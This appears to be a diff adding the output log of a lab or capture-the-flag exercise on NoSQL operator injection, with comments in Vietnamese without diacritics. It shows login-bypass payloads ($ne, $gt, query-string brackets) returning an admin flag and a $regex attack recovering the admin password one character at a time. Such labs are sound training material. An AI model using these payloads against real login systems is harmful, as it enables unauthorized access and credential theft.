@@ -1,0 +1,54 @@
+############################################################
+# 0. Backend dang dung
+############################################################
+{"backend":"mongomock","info":"POST /login JSON hoac GET /login query-string"}
+
+
+############################################################
+# 1. Dang nhap thuong (sai pass) -> 401
+############################################################
+{"msg":"sai tai khoan hoac mat khau","ok":false}
+
+
+############################################################
+# 2. AUTH BYPASS (JSON): password = {"$ne": null}
+#    -> password != null luon dung -> dang nhap thanh admin
+############################################################
+{"flag":"WEB{nosql_operator_injection_auth_bypass}","ok":true,"role":"admin","username":"admin"}
+
+
+############################################################
+# 3. AUTH BYPASS khong can biet username: dung $gt rong
+#    {"username":{"$gt":""},"password":{"$gt":""}} -> user dau tien (admin)
+############################################################
+{"flag":"WEB{nosql_operator_injection_auth_bypass}","ok":true,"role":"admin","username":"admin"}
+
+
+############################################################
+# 4. AUTH BYPASS (QUERY STRING): password[$ne]=x
+#    kieu framework tu parse ngoac thanh {"$ne":"x"}
+############################################################
+{"flag":"WEB{nosql_operator_injection_auth_bypass}","ok":true,"role":"admin","username":"admin"}
+
+
+############################################################
+# 5. Trich mat khau admin tung ky tu bang $regex (xem exploit_regex.py)
+############################################################
+  ^A.*  -> True
+  ^Z.*  -> False
+  da trich: A
+  da trich: Ad
+  da trich: Adm
+  da trich: Adm1
+  da trich: Adm1n
+  da trich: Adm1nS
+  da trich: Adm1nSe
+  da trich: Adm1nSec
+  da trich: Adm1nSecr
+  da trich: Adm1nSecre
+  da trich: Adm1nSecret
+  da trich: Adm1nSecret2
+  da trich: Adm1nSecret20
+  da trich: Adm1nSecret202
+  da trich: Adm1nSecret2024
+  => mat khau admin: Adm1nSecret2024
